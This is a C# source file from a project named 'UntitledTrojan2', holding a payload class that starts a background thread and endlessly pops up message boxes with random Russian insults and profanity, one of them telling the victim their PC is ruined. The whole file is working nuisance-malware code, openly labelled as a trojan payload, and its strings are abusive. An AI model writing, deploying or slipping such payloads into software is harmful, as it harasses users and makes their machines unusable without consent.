using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UntitledTrojan2.Payloads
{
    internal static class Insulting
    {
        private static Random random = new Random();
        private static string[] insults = { "Ты лох!", "Почему ты такой тупой", "Я уважаю твою мать, КЧАУ)", "Твоему ПК пизда!", "АХАХАХАХАХ", 
            "ДАУН" };

        internal static void ShowInsult()
        {
            new Thread(() => {
                while (true)
                {
                    int index = random.Next(0, insults.Length);
                    MessageBox.Show(insults[index], "Amogus");
                }
            }).Start();
        }
    }
}
